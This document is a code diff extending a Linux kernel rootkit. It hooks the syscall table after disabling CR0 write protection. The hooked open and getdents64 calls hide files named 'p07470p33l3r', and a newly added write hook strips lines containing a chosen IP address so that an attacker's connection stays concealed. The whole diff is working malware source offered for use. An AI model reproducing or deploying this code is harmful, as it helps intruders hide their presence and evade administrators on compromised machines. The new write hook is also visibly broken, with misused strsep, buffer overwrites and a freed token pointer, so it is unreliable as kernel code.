@@ -39,10 +39,13 @@ typedef unsigned long psize; // Set custom var psize to 8 bytes (64bits)
 /* Variables */
 
 psize *sys_call_table; // Store syscall table location
-char *hide = "p07470p33l3r"; // Name of shit to hide from user
 
-/* Hacked Syscall Declarations */
+char *hide_file = "p07470p33l3r"; // Name of files/directories to hide from user
+char *hide_ip = "192.168.1.145"; // Name of IP to hide from user
 
+/* Hacked Syscall Pointers */
+
+asmlinkage ssize_t (*orig_write)(int fd, const void *buff, size_t count);
 asmlinkage int (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
 asmlinkage int (*orig_open)(const char *, int, mode_t);
 
@@ -70,6 +73,36 @@ psize **find_sys_call_table(void) { // Finds the system call table (duh)
 
 /* Hacked System Calls */
 
+/* Hacked Write Syscall */
+
+asmlinkage ssize_t hacked_write(int fd, const void *buff, size_t count){ // Hacked version of the write syscall
+	char *write_buff = (char*) kmalloc(1024, GFP_KERNEL);
+	copy_from_user(write_buff, buff, 1023);
+
+	if(strstr(write_buff, hide_ip) == NULL){ // If the text doesn't contain our IP at all, run normal write call
+		kfree(write_buff);
+		return orig_write(fd, buff, count);
+	}
+	else{ // Otherwise, we want to remove the line that contains our IP
+		char *newText = (char*) kmalloc(1024, GFP_KERNEL); // Store the result with no IP
+		char *token = strsep(write_buff, "\n"); // Split each line on newline character
+
+		while(token != NULL){ 
+			if(strstr(token, hide_ip) == NULL){
+				strcpy(newText, token);
+				token = strsep(&buff, "\n");
+			}
+		}
+
+		copy_to_user(buff, newText, 1023);
+
+		//printk("Write Text:%s", newText);
+		kfree(token);
+		kfree(write_buff);
+		return orig_write(fd, buff, count);
+	}
+}
+
 /* Hacked Open Syscall */
 
 asmlinkage int hacked_open(const char *pathname, int flags, mode_t mode){ // Hacked version of the open syscall
@@ -79,7 +112,7 @@ asmlinkage int hacked_open(const char *pathname, int flags, mode_t mode){ // Hac
 
         copy_from_user(kernel_pathname, pathname, 255); // Move user shit to kernel land
 
-        if(strstr(kernel_pathname, hide) != NULL){ // See if it has our hide string in the name
+        if(strstr(kernel_pathname, hide_file) != NULL){ // See if it has our hide string in the name
                 kfree(kernel_pathname);
                 return -ENOENT; // Say there is no spoo- I mean file
         }
@@ -102,11 +135,11 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 		dirp2 = (struct linux_dirent64 *) kmalloc(tmp, GFP_KERNEL);
 		copy_from_user(dirp2, dirp, tmp);
 		dirp3 = dirp2;
-		t= tmp;
+		t = tmp;
 		while (t > 0){
 			n = dirp3->d_reclen;
 			t -= n;
-			if(strstr((char*) &(dirp3->d_name), hide) != NULL){
+			if(strstr((char*) &(dirp3->d_name), hide_file) != NULL){
 				if (t != 0){
 					memmove(dirp3, (char *) dirp3 + dirp3->d_reclen,t);
 				}
@@ -142,6 +175,7 @@ int rootkit_init(void) { // Start lel rootkit
 
 	write_cr0(read_cr0() & (~0x10000)); // Turn on memory write to syscall table
 
+	orig_write = (void *)xchg(&sys_call_table[__NR_write],hacked_write); // Replace write with hacked open
 	orig_open = (void *)xchg(&sys_call_table[__NR_open],hacked_open); // Replace open with hacked open
 	orig_getdents64 = (void *)xchg(&sys_call_table[__NR_getdents64],hacked_getdents64); // Replace getdents64 with hacked getdents64
 
@@ -155,9 +189,10 @@ int rootkit_init(void) { // Start lel rootkit
 void rootkit_exit(void) {
 	write_cr0(read_cr0() & (~0x10000)); // Turn on memory write to syscall table
 
+	xchg(&sys_call_table[__NR_write],orig_write); // Replace hacked write with original
 	xchg(&sys_call_table[__NR_open],orig_open); // Replace hacked open with original
 	xchg(&sys_call_table[__NR_getdents64],orig_getdents64); // Replace hacked getdents64 with original
-
+	
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 
 	printk("Rootkit Exited\n"); // We done
